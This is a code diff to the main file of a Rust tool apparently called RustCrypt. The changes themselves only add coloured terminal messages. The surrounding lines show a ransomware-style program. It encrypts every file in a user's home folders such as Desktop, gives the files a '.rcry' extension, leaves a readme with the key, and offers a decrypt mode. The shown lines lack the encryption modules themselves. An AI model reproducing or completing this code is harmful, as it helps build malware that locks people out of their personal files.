@@ -4,8 +4,10 @@ use std::io::{self, Write};
 use std::path::Path;
 mod encrypt;
 mod decrypt;
+use termcolor::{Color, ColorChoice, ColorSpec, StandardStream, WriteColor};
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let mut stdout = StandardStream::stdout(ColorChoice::Auto);
     let rustcrypt = r#"
         ____             __  ______                 __ 
        / __ \__  _______/ /_/ ____/______  ______  / /_
@@ -43,7 +45,9 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         )
         .get_matches();
 
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Red)).set_bold(true)).unwrap();
     let home_dir = dirs::home_dir().ok_or("Could not determine the home directory")?;
+    stdout.reset().unwrap();
 
     let folders = vec![
         "Desktop",
@@ -75,7 +79,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 encrypt::encrypt_files(&folder_path, &adjusted_key, &excluded_extensions)?;
             }
         }
-        println!("Files encrypted successfully");
+        stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)).set_bold(true)).unwrap();
+        writeln!(&mut stdout, "Files encrypted successfully !").unwrap();
+        stdout.reset().unwrap();
+        
         write_readme(&key, &home_dir)?;
     } else if matches.get_flag("decrypt") {
         if let Some(key) = matches.get_one::<String>("key") {
@@ -88,9 +95,14 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                     decrypt::decrypt_files(&folder_path, &key_bytes, &["rcry"])?;
                 }
             }
-            println!("Files decrypted successfully");
+            stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)).set_bold(true)).unwrap();
+            writeln!(&mut stdout, "Files decrypted successfully !").unwrap();
+            stdout.reset().unwrap();
         } else {
             eprintln!("Decryption key is required");
+            stdout.set_color(ColorSpec::new().set_fg(Some(Color::Red)).set_bold(true)).unwrap();
+            writeln!(&mut stdout, "Decryption key is required").unwrap();
+            stdout.reset().unwrap();
         }
     } else {
         println!("No valid operation specified. Use --help for more information.");
